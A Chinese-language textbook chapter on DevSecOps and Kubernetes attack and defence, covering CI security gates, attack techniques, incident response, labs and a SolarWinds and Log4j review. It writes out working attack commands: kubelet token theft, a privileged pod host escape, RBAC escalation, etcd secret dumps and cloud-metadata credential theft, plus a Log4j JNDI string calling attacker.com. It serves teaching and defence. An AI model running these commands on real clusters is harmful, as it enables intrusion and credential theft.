# 第7章 DevSecOps 与云原生攻防实战

> **本章目标**：将安全融入整个软件交付流程，掌握云原生环境的攻防技术。我们将学习 DevSecOps 的完整实践、常见的攻击向量、防御策略，以及事件响应流程。
>
> 读完本章后，你应该能够设计并实施完整的 DevSecOps 流水线，理解 K8s 环境的攻击面，并具备基本的红蓝对抗能力。

---

## 7.1 DevSecOps 核心理念

### 7.1.1 安全左移（Shift Left）

传统的安全模式是在软件开发完成后进行安全审查，这导致了：
- 安全问题发现晚，修复成本高
- 安全团队成为交付瓶颈
- 开发人员缺乏安全意识

DevSecOps 将安全活动"左移"到开发早期阶段：

```
传统安全模型：
设计 → 开发 → 测试 → 部署 → 运行 → 安全审查（发现问题）
                                                  │
                                                  ▼
                                           返工！延迟！成本增加！

DevSecOps 模型：
安全 → 设计 → 安全 → 开发 → 安全 → 测试 → 安全 → 部署 → 安全 → 运行
  │              │              │              │              │
  └─ 威胁建模    └─ SAST扫描    └─ DAST扫描    └─ 镜像扫描    └─ 运行时监控
     安全需求      依赖检查       集成测试       签名验证       异常检测
```

**安全左移的收益**：

| 阶段 | 发现漏洞的修复成本 | 修复时间 |
|------|------------------|---------|
| 设计阶段 | 1x（基准） | 小时 |
| 开发阶段 | 5x | 天 |
| 测试阶段 | 10x | 周 |
| 生产阶段 | 100x+ | 月 |

### 7.1.2 DevSecOps 能力成熟度模型

| 级别 | 名称 | 特征 | CI/CD 表现 |
|------|------|------|-----------|
| **1** | 初始 | 安全团队独立，事后检查 | 无自动化安全 |
| **2** | 可管理 | 安全工具引入，手动触发 | 安全扫描可选，报告供参考 |
| **3** | 已定义 | 安全门禁标准化 | 关键检查自动阻断，漏洞分级 |
| **4** | 量化管理 | 安全度量指标驱动 | 漏洞修复 SLA，安全评分 |
| **5** | 优化 | 自动化响应，持续改进 | 自适应安全策略，预测性防御 |

**各级别的关键活动**：

**级别 1 → 2**：
- 引入漏洞扫描工具（Trivy、Snyk）
- 建立安全基线文档
- 开发团队和安全团队定期沟通

**级别 2 → 3**：
- CI/CD 中强制安全门禁（发现 HIGH/CRITICAL 漏洞阻断构建）
- 镜像签名验证
- 准入控制策略部署

**级别 3 → 4**：
- 安全度量仪表盘（漏洞修复时间、扫描覆盖率）
- 自动化的合规检查（kube-bench、Kubescape）
- 运行时安全监控（Falco、Tetragon）

**级别 4 → 5**：
- 自适应安全策略（基于运行时行为调整）
- 威胁情报集成
- 预测性漏洞管理

### 7.1.3 GitOps 安全

GitOps 使用 Git 作为基础设施和应用配置的单一真相源，但也带来了新的安全挑战：

**GitOps 安全最佳实践**：

```
Git 仓库安全
    │
    ├── 分支保护
    │   └── main 分支：需要 PR + Code Review + CI 通过
    │
    ├── 敏感信息保护
    │   ├── 预提交钩子：gitleaks 检测密钥
    │   ├── Sealed Secrets / SOPS 加密
    │   └── 禁止提交 kubeconfig、证书
    │
    ├── 访问控制
    │   ├── 仓库级：最小权限（只读/写入/管理）
    │   ├── 分支级：保护规则
    │   └── 审计：所有变更可追踪
    │
    └── CI 安全
        ├── 不将 Secret 存储在 CI 环境变量（除非加密）
        ├── 使用短期凭证（OIDC 而非长期 Token）
        └── 隔离构建环境
```

**ArgoCD 安全配置**：

```yaml
# ArgoCD 应用配置
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: secure-app
  namespace: argocd
  # 启用同步策略
  annotations:
    argocd.argoproj.io/sync-wave: "1"
spec:
  project: production
  source:
    repoURL: https://github.com/company/gitops-repo.git
    targetRevision: main
    path: apps/production
    # 验证提交签名
    verifiedCommit: true
  destination:
    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
      # 不允许自动同步到生产（需要人工审批）
      allowEmpty: false
    syncOptions:
    - CreateNamespace=true
    retry:
      limit: 3
```

---

## 7.2 完整 DevSecOps 流水线

### 7.2.1 流水线架构

```
┌─────────────────────────────────────────────────────────────────┐
│                        Developer                                │
│                    Git Push / PR                                │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│  阶段 0：Pre-commit / Git Hooks                                 │
│  ├─ Secrets detection (gitleaks, git-secrets, truffleHog)       │
│  ├─ Lint (hadolint Dockerfile, kube-linter K8s manifests)       │
│  └─ 代码格式化 (gofmt, black, prettier)                         │
└──────────────────────────┬──────────────────────────────────────┘
                           │ 失败则阻止提交
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│  阶段 1：CI - 代码安全检查                                       │
│  ├─ SAST (SonarQube, Semgrep, CodeQL)                          │
│  ├─ Dependency Scan (Snyk, OWASP DC, npm audit)                │
│  ├─ IaC Scan (Checkov, tfsec, trivy config)                    │
│  ├─ Secret Scan (gitleaks --no-git)                            │
│  └─ Unit Test + Coverage                                       │
└──────────────────────────┬──────────────────────────────────────┘
                           │ 失败则阻断 PR
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│  阶段 2：CI - 构建与镜像安全                                     │
│  ├─ Build Image (多阶段构建，最小化镜像)                         │
│  ├─ Image Scan (Trivy, Grype - 阻断 HIGH/CRITICAL)              │
│  ├─ SBOM Generation (Syft, SPDX/CycloneDX)                     │
│  ├─ Image Sign (Cosign keyless/signing)                        │
│  └─ Push to Registry                                           │
└──────────────────────────┬──────────────────────────────────────┘
                           │ 失败则不推送镜像
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│  阶段 3：CD - 部署前验证                                         │
│  ├─ Admission Control (Kyverno/OPA verify image signature)     │
│  ├─ Policy Scan (Kubescape, kube-bench before deploy)          │
│  ├─ Dry Run (kubectl apply --dry-run=server)                   │
│  └─ GitOps Sync (ArgoCD / Flux)                                │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│  阶段 4：Runtime - 持续安全监控                                  │
│  ├─ Runtime Threat Detection (Falco rules)                     │
│  ├─ Network Policy Enforcement (Cilium/Calico)                 │
│  ├─ Vulnerability Management (Runtime CVE re-scan)             │
│  ├─ Compliance Monitoring (continuous kube-bench)              │
│  └─ Incident Response (SOAR integration)                       │
└─────────────────────────────────────────────────────────────────┘
```

### 7.2.2 关键安全门禁

```yaml
# GitLab CI 完整示例
stages:
  - pre-commit
  - build
  - test
  - scan
  - sign
  - deploy

# ===== 阶段 0：密钥泄露检测 =====
secrets-scan:
  stage: pre-commit
  image: zricethezav/gitleaks:latest
  script:
    - gitleaks detect --source . --verbose --redact
  allow_failure: false   # 发现密钥则立即失败

# ===== 阶段 1：代码质量与安全 =====
sast:
  stage: test
  image: returntocorp/semgrep:latest
  script:
    - semgrep --config=auto --error --json --output=semgrep.json .
  artifacts:
    reports:
      sast: semgrep.json
  allow_failure: false   # SAST 问题阻断构建

dependency-check:
  stage: test
  image: owasp/dependency-check-action:latest
  script:
    - /usr/share/dependency-check/bin/dependency-check.sh
        --project "$CI_PROJECT_NAME"
        --scan .
        --format ALL
        --failOnCVSS 7   # CVSS >= 7 则失败
  artifacts:
    reports:
      dependency_scanning: dependency-check-report.json

# ===== 阶段 2：镜像构建与扫描 =====
build:
  stage: build
  image: docker:24-dind
  services:
    - docker:24-dind
  script:
    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .
    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

image-scan:
  stage: scan
  image: aquasec/trivy:latest
  script:
    - trivy image --exit-code 1 --severity HIGH,CRITICAL
        --format template --template "@contrib/gitlab.tpl"
        -o gl-container-scanning-report.json
        $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  artifacts:
    reports:
      container_scanning: gl-container-scanning-report.json
  allow_failure: false   # 高危漏洞阻断部署

# ===== 阶段 3：镜像签名 =====
sign-image:
  stage: sign
  image: bitnami/cosign:latest
  script:
    - cosign sign --key $COSIGN_PRIVATE_KEY $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  only:
    - main

# ===== 阶段 4：部署 =====
deploy-staging:
  stage: deploy
  image: bitnami/kubectl:latest
  script:
    - kubectl set image deployment/app app=$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA -n staging
  environment:
    name: staging
  only:
    - main

deploy-production:
  stage: deploy
  image: bitnami/kubectl:latest
  script:
    - kubectl set image deployment/app app=$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA -n production
  environment:
    name: production
  when: manual    # 需要人工审批
  only:
    - main
```

---

## 7.3 云原生攻防实战

### 7.3.1 攻击面分析

```
                        [攻击者]
                           │
           ┌───────────────┼───────────────┐
           │               │               │
           ▼               ▼               ▼
      [外部暴露]      [供应链攻击]     [内部横向移动]
           │               │               │
    ┌──────┴──────┐  ┌────┴────┐   ┌──────┴──────┐
    │ Ingress/API │  │恶意镜像  │   │ ServiceAccount│
    │ Dashboard   │  │依赖投毒  │   │ Token 窃取    │
    │ Kubelet     │  │构建系统  │   │ 特权 Pod 创建 │
    │ etcd        │  │泄露密钥  │   │ etcd 数据读取 │
    │ 云元数据    │  │          │   │ 网络嗅探      │
    └─────────────┘  └─────────┘   └─────────────┘
```

### 7.3.2 常见攻击技术详解

#### 攻击 1：利用暴露的 Kubelet 端口

Kubelet 暴露两个关键端口：
- **10250**：HTTPS，用于 API Server 调用（需要认证）
- **10255**：HTTP，只读端口（极度危险！）

```bash
# 攻击：如果 10255 开启，无需认证即可获取节点信息
curl http://<node-ip>:10255/pods           # 列出所有 Pod
curl http://<node-ip>:10255/stats/summary  # 获取资源统计
curl http://<node-ip>:10255/metrics        # 获取 Prometheus 指标

# 如果 10250 认证配置错误（匿名认证开启）
curl -k https://<node-ip>:10250/pods       # 可能无需认证

# 更严重的攻击：通过 kubelet exec 进入任意容器
curl -k -X POST \
  "https://<node-ip>:10250/exec/default/nginx/nginx" \
  -d "cmd=cat&cmd=/var/run/secrets/kubernetes.io/serviceaccount/token"
```

**防御措施**：
```yaml
# /var/lib/kubelet/config.yaml
authentication:
  anonymous:
    enabled: false          # 禁用匿名认证
  webhook:
    enabled: true
authorization:
  mode: Webhook
readOnlyPort: 0             # 禁用 10255 端口
```

#### 攻击 2：创建特权 Pod 逃逸

```yaml
# attacker-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true              # 共享宿主机 PID 命名空间
  hostNetwork: true          # 共享宿主机网络
  hostIPC: true              # 共享宿主机 IPC
  containers:
  - name: escape
    image: ubuntu:22.04
    command: ["sleep", "3600"]
    securityContext:
      privileged: true       # 特权容器 = 拥有宿主机 root 权限
      runAsUser: 0
    volumeMounts:
    - name: host-root
      mountPath: /host
    - name: docker-sock
      mountPath: /var/run/docker.sock
    - name: proc
      mountPath: /host/proc
  volumes:
  - name: host-root
    hostPath:
      path: /
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
  - name: proc
    hostPath:
      path: /proc
```

```bash
# 进入容器后的逃逸操作：
# 方法 1：chroot 到宿主机根文件系统
chroot /host /bin/bash
# 现在你就是宿主机 root！

# 方法 2：通过 Docker Socket 创建特权容器
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
# 可以创建新的特权容器逃逸

# 方法 3：通过 /proc 访问宿主机进程
ls /proc/1/root/etc/shadow   # 读取宿主机 shadow 文件

# 方法 4：利用 hostPID 进入宿主机命名空间
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

**防御措施**：
1. Pod Security Standards：`restricted` 级别禁止所有逃逸条件
2. 准入控制：Kyverno/OPA 禁止 privileged、hostPID、hostNetwork、hostPath
3. Falco 规则：`Launch Privileged Container`
4. NetworkPolicy：限制异常出站连接

#### 攻击 3：ServiceAccount Token 窃取与横向移动

```bash
# Pod 中默认挂载的 Token（1.24+ 为投射 Token）
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 用这个 Token 访问 API Server
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN"

# 如果 ServiceAccount 权限过大，可以：
# 1. 列出所有 Secret
kubectl get secrets --all-namespaces

# 2. 创建特权 Pod 逃逸
kubectl run escape --image=ubuntu --privileged --overrides='
{"spec": {"hostPID": true, "volumes": [{"name": "host", "hostPath": {"path": "/"}}]}}'

# 3. 修改 RBAC 提权
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: evil-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
```

**防御措施**：
1. `automountServiceAccountToken: false`（不需要 API 访问的 Pod）
2. 最小权限 RBAC
3. 使用 TokenRequest API（短期 Token）
4. Falco 检测异常的 API 调用

#### 攻击 4：etcd 数据窃取

```bash
# 如果能访问 etcd（例如从控制平面节点）
ETCDCTL_API=3 etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only

# 提取具体的 Secret 内容
ETCDCTL_API=3 etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/default/db-credentials

# 如果 etcd 未加密，Secret 以 Base64 明文存储
# 可以直接读取！
```

**防御措施**：
1. etcd 启用静态加密（EncryptionConfiguration）
2. etcd 只能被 API Server 访问（防火墙限制 2379/2380）
3. 使用独立的 etcd CA
4. etcd 数据目录权限严格限制

#### 攻击 5：云元数据服务访问

云环境的元数据服务（IMDS）是常见的横向移动路径：

```bash
# AWS IMDS
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 可以获取临时 AWS 凭证！

# Azure IMDS
curl http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H Metadata:true

# GCP IMDS
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H Metadata-Flavor:Google
```

**防御措施**：
1. 使用 NetworkPolicy 阻止对 169.254.169.254 的访问
2. 使用 IMDSv2（AWS，需要会话令牌）
3. Falco 规则检测元数据访问
4. 节点级别的防火墙规则

```yaml
# NetworkPolicy 阻止元数据访问
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-imds
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32   # 阻止元数据 IP
```

### 7.3.3 Kubernetes Goat 靶场实践

Kubernetes Goat 是一个 intentionally vulnerable 的 K8s 环境，用于学习容器安全：

```bash
# 安装 Kubernetes Goat（仅在隔离环境！）
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
bash setup-kubernetes-goat.sh

# 访问指南
bash access-kubernetes-goat.sh
```

**关键场景**：

| 场景 | 攻击技术 | 防御要点 |
|------|---------|---------|
| 敏感信息暴露 | 环境变量、ConfigMap 泄露 | 使用 Secret，审计配置 |
| Docker Registry 暴露 | 未认证的镜像仓库 | 启用认证，NetworkPolicy |
| 过度授权的 SA | Token 窃取、横向移动 | 最小权限 RBAC |
| 命令注入 Sidecar | 利用调试容器 | 限制 sidecar 权限 |
| 容器逃逸 | 特权容器、危险挂载 | PSS restricted |
| 内部网络扫描 | 服务发现、端口扫描 | NetworkPolicy |
| 有状态应用利用 | 利用有状态 Pod 特性 | 安全加固 |
| Helm Chart 漏洞 | 不安全的 Chart 配置 | Chart 扫描 |
| Kubelet 利用 | 10250/10255 端口 | 禁用只读端口 |
| 监控组件暴露 | Prometheus/Grafana 未认证 | 启用认证 |

---

## 7.4 事件响应

### 7.4.1 应急响应流程

```
┌─────────────┐
│  检测       │  ← Falco 告警、监控异常、用户报告
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  分析       │  ← 确定影响范围、识别攻击路径、收集证据
│             │
│ • 哪些 Pod/节点受影响？    │
│ • 攻击者获得了什么权限？    │
│ • 是否有数据外泄？          │
│ • 攻击路径是什么？          │
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  遏制       │  ← 防止损害扩大
│             │
│ • 隔离受感染 Pod（cordon/drain）│
│ • 撤销泄露凭证（删除 Token/证书）│
│ • 阻断恶意网络连接（NetworkPolicy）│
│ • 快照受影响节点（取证）        │
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  根除       │  ← 移除威胁
│             │
│ • 删除恶意资源                  │
│ • 修补漏洞（升级、配置修复）     │
│ • 重建干净的镜像和 Pod           │
│ • 轮换所有可能泄露的凭证         │
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  恢复       │  ← 恢复正常运营
│             │
│ • 验证系统完整性                │
│ • 逐步恢复服务                  │
│ • 加强监控                      │
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  事后分析    │  ← 学习和改进
│             │
│ • 编写事件报告                  │
│ • 识别根本原因                  │
│ • 更新安全策略                  │
│ • 修复流程缺陷                  │
└─────────────┘
```

### 7.4.2 取证分析

```bash
# 1. 保存受感染 Pod 的日志
kubectl logs <compromised-pod> --previous > incident-logs.txt

# 2. 导出 Pod 描述信息
kubectl describe pod <compromised-pod> > incident-describe.txt

# 3. 查看 Pod 中的文件系统（如果还能访问）
kubectl cp <compromised-pod>:/tmp /evidence/tmp

# 4. 检查节点上的容器运行时
# 在节点上执行：
sudo crictl ps -a | grep <pod-name>
sudo crictl inspect <container-id> > container-inspect.json

# 5. 检查审计日志
kubectl get events --field-selector involvedObject.name=<pod-name>

# 6. 检查网络连接（如果 Falco/Cilium 记录了流量）
# Cilium Hubble
hubble observe --pod <pod-name> --follow

# 7. 检查是否有新的 RBAC 绑定
kubectl get rolebindings,clusterrolebindings --all-namespaces | grep -i suspicious

# 8. 检查 etcd 变更历史（如果有备份）
# 对比备份前后的 etcd 数据
```

### 7.4.3 自动化响应

```yaml
# Falco + Falcosidekick + 自定义 Webhook 自动响应
# 当检测到特权容器时：
# 1. 发送 Slack 告警
# 2. 调用 Webhook 自动删除 Pod
# 3. 创建 JIRA Ticket

apiVersion: v1
kind: ConfigMap
metadata:
  name: falcosidekick-config
  namespace: falco
data:
  config.yaml: |
    slack:
      webhookurl: "https://hooks.slack.com/services/xxx"
      minimumpriority: "warning"
    webhook:
      address: "https://security-automation.company.com/handle"
      customHeaders: "Authorization: Bearer xxxx"
      minimumpriority: "critical"
    customfields: "environment:production,team:security"
```

```python
# 自动响应 Webhook 服务示例（Python Flask）
from flask import Flask, request
import kubernetes

app = Flask(__name__)

@app.route('/handle', methods=['POST'])
def handle_falco_alert():
    alert = request.json
    
    # 提取信息
    priority = alert.get('priority')
    rule = alert.get('rule')
    output_fields = alert.get('output_fields', {})
    
    pod_name = output_fields.get('k8s.pod.name')
    namespace = output_fields.get('k8s.ns.name')
    
    # CRITICAL 级别自动删除 Pod
    if priority == 'CRITICAL' and rule == 'Launch Privileged Container':
        print(f"Auto-deleting privileged pod {namespace}/{pod_name}")
        
        kubernetes.config.load_incluster_config()
        v1 = kubernetes.client.CoreV1Api()
        v1.delete_namespaced_pod(pod_name, namespace)
        
        # 创建事件记录
        # 发送告警到 SIEM
    
    return {"status": "processed"}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

---

## 7.5 生产案例：DevSecOps 转型实践

### 7.5.1 背景

某互联网公司（500+ 开发人员，50+ K8s 集群）从传统安全模式转型 DevSecOps：

### 7.5.2 转型路径

```
第 1 季度：基础建设
├── 统一容器镜像仓库（Harbor）
├── CI/CD 集成 Trivy 镜像扫描
├── 部署 Falco 运行时监控
└── 制定安全基线文档

第 2 季度：自动化
├── GitLab CI 安全门禁（HIGH/CRITICAL 阻断）
├── Kyverno 准入策略部署
├── Cosign 镜像签名
└── NetworkPolicy 默认拒绝

第 3 季度：度量与优化
├── 安全度量仪表盘（Grafana）
├── 漏洞修复 SLA（HIGH: 7天, CRITICAL: 24小时）
├── 自动化的 kube-bench 扫描
└── 红蓝对抗演练

第 4 季度：成熟运营
├── 自适应安全策略
├── 威胁情报集成
├── 安全混沌工程
└── CKS 认证培训
```

### 7.5.3 关键成果

| 指标 | 转型前 | 转型后 |
|------|--------|--------|
| 生产漏洞数 | 200+ HIGH/CRITICAL | < 10 |
| 漏洞修复时间 | 平均 30 天 | HIGH: 3天, CRITICAL: 12小时 |
| 安全事件数 | 5-10/月 | < 1/月 |
| 镜像扫描覆盖率 | 20% | 100% |
| 运行时检测覆盖率 | 0% | 100% |

---

## 7.6 本章实验

### 实验 7.1：模拟 ServiceAccount Token 窃取（20 分钟）

```bash
# 步骤 1：创建一个使用默认 SA 的 Pod
kubectl run attacker --image=bitnami/kubectl --restart=Never -- sleep 3600

# 步骤 2：进入 Pod
kubectl exec -it attacker -- /bin/sh

# 步骤 3：读取默认 Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 步骤 4：尝试列出 Pod（默认 SA 通常有权限）
kubectl get pods

# 步骤 5：尝试创建特权 Pod（应该失败，但验证权限）
kubectl run test --image=nginx --privileged 2>&1 | head -5

# 步骤 6：退出并检查 Falco 日志（如果已部署）
# kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "Unexpected connection"

# 步骤 7：修复 - 禁用自动挂载
kubectl run secure-pod --image=bitnami/kubectl --restart=Never \
  --overrides='{"spec": {"automountServiceAccountToken": false}}' \
  -- sleep 3600

kubectl exec -it secure-pod -- ls /var/run/secrets/kubernetes.io/serviceaccount/
# 目录不存在！

# 清理
kubectl delete pod attacker secure-pod
```

### 实验 7.2：特权容器逃逸演示（25 分钟）

```bash
# ⚠️ 警告：仅在隔离测试环境中进行！

# 步骤 1：创建特权容器
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-demo
spec:
  hostPID: true
  containers:
  - name: escape
    image: ubuntu:22.04
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# 步骤 2：进入容器
kubectl exec -it escape-demo -- /bin/bash

# 步骤 3：chroot 到宿主机
chroot /host /bin/bash

# 步骤 4：验证你已经在宿主机上
ps aux | head -10    # 看到宿主机所有进程
cat /etc/hostname    # 宿主机主机名

# 步骤 5：退出并清理
exit
exit
kubectl delete pod escape-demo --force

# 步骤 6：验证 PSS 会阻止这种 Pod
kubectl label namespace default pod-security.kubernetes.io/enforce=restricted
kubectl run test --image=ubuntu --privileged
# 预期：被拒绝

# 清理标签
kubectl label namespace default pod-security.kubernetes.io/enforce-
```

### 实验 7.3：Kubernetes Goat 场景（40 分钟）

```bash
# 步骤 1：安装 Kubernetes Goat（隔离环境！）
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
bash setup-kubernetes-goat.sh

# 步骤 2：访问指南
bash access-kubernetes-goat.sh

# 步骤 3：完成场景 1 - 敏感信息暴露
# 提示：检查环境变量和 ConfigMap

# 步骤 4：完成场景 5 - 容器逃逸
# 提示：利用挂载的 /proc 或 /sys

# 步骤 5：完成场景 7 - 过度授权的 ServiceAccount
# 提示：读取 Token，访问 API Server

# 清理
bash teardown-kubernetes-goat.sh
```

### 实验 7.4：构建自动响应流水线（30 分钟）

```bash
# 步骤 1：部署 Falco + Falcosidekick
helm install falco falcosecurity/falco \
  -n falco --create-namespace \
  --set driver.kind=modern_ebpf \
  --set falcosidekick.enabled=true

# 步骤 2：创建一个模拟的响应服务
# （实际生产应使用可靠的 Webhook 服务）
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: ServiceAccount
metadata:
  name: incident-responder
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-deleter
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["delete", "get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: default
  name: incident-responder-binding
subjects:
- kind: ServiceAccount
  name: incident-responder
  namespace: default
roleRef:
  kind: Role
  name: pod-deleter
  apiGroup: rbac.authorization.k8s.io
EOF

# 步骤 3：测试 Falco 告警
kubectl run test-priv --image=nginx --privileged --restart=Never

# 步骤 4：查看 Falco 日志中的告警
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "Privileged"

# 清理
kubectl delete pod test-priv
helm uninstall falco -n falco
kubectl delete namespace falco
kubectl delete sa incident-responder
kubectl delete role pod-deleter
kubectl delete rolebinding incident-responder-binding
```

---

## 7.7 本章练习题

### 选择题

1. **DevSecOps 中"安全左移"的含义是？**
   - A. 将安全团队移到开发团队的左边
   - B. 将安全检查尽可能早地融入开发流程
   - C. 将安全预算分配给左边的团队
   - D. 将安全工具部署在左边的服务器上

2. **Kubelet 的哪个端口最危险，应该禁用？**
   - A. 10250
   - B. 10255
   - C. 6443
   - D. 2379

3. **以下哪种方式不能防御 ServiceAccount Token 窃取？**
   - A. automountServiceAccountToken: false
   - B. 使用短期 Token
   - C. 将 Token 存储在环境变量中
   - D. 最小权限 RBAC

4. **事件响应的 PDCERF 模型中，"C"代表？**
   - A. Create（创建）
   - B. Contain（遏制）
   - C. Check（检查）
   - D. Clean（清理）

5. **以下哪个不是云元数据服务的 IP 地址？**
   - A. 169.254.169.254
   - B. 192.168.1.1
   - C. metadata.google.internal
   - D. 以上都是

### 简答题

1. 解释 DevSecOps 安全左移的核心理念。为什么在生产阶段发现漏洞的修复成本远高于设计阶段？

2. 描述一个完整的容器逃逸攻击链：从获取 Pod 权限到控制宿主机。每一步需要哪些前提条件？如何防御？

3. 设计一个 Kubernetes 事件响应流程。当 Falco 检测到特权容器创建时，应该执行哪些步骤？

### 实践题

1. 在一个测试集群中：
   - 创建一个过度授权的 ServiceAccount
   - 从一个 Pod 中窃取 Token
   - 使用 Token 访问 API Server
   - 记录所有命令和输出
   - 然后修复配置，确保 Token 不再可窃取

2. 编写一个完整的 CI/CD 流水线（使用 GitHub Actions 或 GitLab CI），包含：
   - 密钥泄露检测
   - SAST 扫描
   - 依赖漏洞扫描
   - 镜像构建和扫描
   - 镜像签名
   - 部署到 Kubernetes

3. 部署 Falco 并编写自定义规则，检测以下场景：
   - 生产命名空间中创建 hostPath 卷
   - 任何容器访问 /etc/shadow
   - Pod 中出现反向 shell 连接

---

## 7.8 本章小结

| 主题 | 核心内容 | 关键工具 |
|------|---------|---------|
| **DevSecOps** | 安全左移、CI/CD 集成 | GitLab CI, GitHub Actions |
| **GitOps 安全** | 仓库保护、加密 Secret、分支策略 | ArgoCD, Flux, Sealed Secrets |
| **攻击技术** | Kubelet 暴露、特权 Pod、Token 窃取、etcd 窃取 | Kubernetes Goat |
| **防御策略** | PSS、RBAC 最小化、准入控制、运行时检测 | Kyverno, Falco |
| **事件响应** | 检测-分析-遏制-根除-恢复-事后分析 | Falcosidekick, SOAR |
| **自动化** | 自动告警、自动阻断、自动修复 | Webhook, Lambda |

**关键安全原则**：
1. **安全是每个人的责任**：不只是安全团队的事
2. **自动化优先**：安全检查和响应尽可能自动化
3. **假设 breach**：假设攻击者已经在环境中
4. **最小权限**：每个组件只有必要的权限
5. **持续改进**：从事故中学习，不断优化

**下一步建议**：
1. 考取 CKA + CKS 认证
2. 参与开源安全项目（Falco、Trivy、Kubescape）
3. 搭建完整的企业级安全实验环境
4. 定期进行红蓝对抗演练

**下一章预告**：高级架构设计——企业级云原生安全架构、多集群安全、零信任实现。


---

## 7.7 供应链攻击深度分析

### 7.7.1 SolarWinds 事件复盘（2020）

**事件概述**：
SolarWinds Orion 是一款广泛使用的 IT 监控平台。攻击者在 SolarWinds 的构建系统中植入了恶意代码（SUNBURST），通过合法的软件更新分发给约 18,000 个客户，包括美国政府机构。

**攻击链**：

```
攻击者入侵 SolarWinds 开发环境
        │
        ▼
在 Orion 构建系统中植入 SUNBURST 后门
        │
        ▼
后门代码被编译到 Orion 更新包中
        │
        ▼
客户通过自动更新下载并安装后门
        │
        ▼
SUNBURST 在客户环境中休眠 12-14 天
        │
        ▼
与 C2 服务器通信，接收指令
        │
        ▼
在目标环境中横向移动，窃取数据
```

**关键教训**：
1. **构建系统安全**：CI/CD 环境本身需要严格保护
2. **代码签名不足**：签名的代码不一定安全（签名时代码已经是恶意的）
3. **供应链深度**：攻击上游供应商影响范围巨大
4. **检测困难**：合法签名的软件绕过大多数安全检测

**防御措施**：
1. 构建环境隔离（独立的构建节点）
2. 可重现构建（Reproducible Builds）
3. SLSA（Supply-chain Levels for Software Artifacts）框架
4. 代码审查和双人原则
5. 构建日志和审计

### 7.7.2 Log4j 漏洞（CVE-2021-44228）

**事件概述**：
Apache Log4j 2 中的 JNDI 注入漏洞，允许攻击者通过日志消息中的恶意字符串执行任意代码。这是近年来影响最广泛的漏洞之一。

**漏洞原理**：
```java
// Log4j 处理日志消息时，会解析 ${} 占位符
logger.info("User agent: ${jndi:ldap://attacker.com/exploit}");

// 触发 JNDI 查找，连接攻击者的 LDAP 服务器
// 返回恶意 Java 类并执行
```

**影响范围**：
- 几乎所有使用 Java 的应用
- 大量商业软件（Minecraft、Steam、iCloud 等）
- 无数内部企业应用

**容器环境的特殊挑战**：
1. 镜像中可能包含多个 Log4j 版本
2. 基础镜像更新后需要重新构建所有应用
3. 临时修复（如环境变量）可能不完整

**容器环境下的修复流程**：
```bash
# 1. 扫描所有镜像中的 Log4j
for image in $(kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort -u); do
  echo "Scanning $image..."
  trivy image --severity CRITICAL "$image" | grep -i log4j
done

# 2. 更新基础镜像
# 将 Dockerfile 中的基础镜像更新到安全版本

# 3. 重建并重新部署所有应用
# CI/CD 流水线自动执行

